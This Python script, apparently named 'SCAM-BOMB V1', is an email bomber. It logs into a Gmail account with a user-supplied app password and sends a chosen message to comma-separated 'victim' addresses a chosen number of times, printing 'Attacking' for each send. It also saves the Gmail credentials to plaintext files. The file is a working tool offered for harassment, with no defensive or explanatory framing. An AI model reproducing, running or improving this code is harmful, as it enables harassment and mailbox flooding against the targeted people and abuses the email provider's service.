#Built-in library's.
RED = "\033[0;31m"
BLINK = "\033[5m"
import smtplib
from os import access, path, mkdir

print(f"{open('Welcome/welcome.txt', encoding='UTF-8').read()}\n\n") #Welcomes user.

#User inputs
print(RED,BLINK)
if not path.exists("User_Credentials"): #If User_Credentials does not exist, asks for user credentials.
    sender = input("Enter your Gmail ID(s) -> ") #The gmail address that emails will be sent from e.g. example@gmail.com.
    app_password = input("Enter your OTP(One Time Password) -> ") #The app's password that was created from the Gmail address e.g. alig maou tajh jagq.
else: #Otherwise, reads saved user credentials.
    sender = open("User_Credentials/sender.txt", "rt").read() #Reads saved user gmail.
    app_password = open("User_Credentials/app_password.txt", "rt").read() #Reads saved user app password.
receiver = input("Enter the victim(s) Email ID -> ") #Enter the email(s) that you would like to email-bomb.
message = input("Enter the message being sent to victim(s) -> ") #The message that the email user(s) will receive.

# Loop until valid count value is given
while(True):
    try:
        count = int(input("Enter the number of attacks being sent  -> ")) #The amount of emails to be sent to the receiver(s).
    except ValueError:
        print("Please enter an integer for the amount of emails to be sent.")
    except KeyboardInterrupt:
        print("Goodbye!")
        quit()
    
    if count <= 0:
        print("Count must be positive. Received", count)
        continue
    break

#Server
server = smtplib.SMTP("smtp.gmail.com",587) #Initializes SMTP server.
server.starttls() #Start SMTP server.

try: #Attempts to log in to user's gmail account.
    server.login(user= sender, password= app_password) #Logins to user's account.
except smtplib.SMTPAuthenticationError as error: #Incorrect credentials inputted by user.
    print("\nError: Make sure the Gmail address that you inputted is the same as the Gmail account you have created an app password for.\nAlso, double-check your Gmail and app password.")
    print(f"{error}")
    input("Enter to exit...")
    quit() #Quits program.

try:
    if not path.exists("User_Credentials"): #If user credentials does not exist, creates and saves credential files.
        #If there are no errors in credentials, save user information after SMTP verification.
        mkdir("User_Credentials") #Creats User_Credentials folder.
        open("User_Credentials/sender.txt", "xt").write(sender) #Creates and saves user's Gmail address to User_Credentials folder.
        open("User_Credentials/app_password.txt", "xt").write(app_password) #Creates and saves user's Gmail app password to User_Credentials folder.
        input("\nYour credentials have been saved, so you do not have to repeat this process.\nTo change your credentials, go to User_Credentials and change your file information.\nPress enter to continue...")
except OSError: #Operating system error.
    print("\nError: There was an error saving your credentials.")
print(RED,BLINK)
print("\nSCAM-BOMB V1 has started...\n")

for i in range(count): #Amount of messages to be sent.
    for email_receiver in receiver.split(","): #Loops through emails to send emails to.
        try:   
            print(f"Attacking {email_receiver}...")     
            server.sendmail(from_addr= sender, to_addrs=email_receiver, msg=message) #Sends email to receiver.
            print("Attack sent successfully!")
        except smtplib.SMTPException as error:
            print(f"Error: {error}")
            continue


input("\nSCAM-BOMB V1 was successful...\nPress enter to exit...") #Email-bomber finished.
server.close() #Closes server.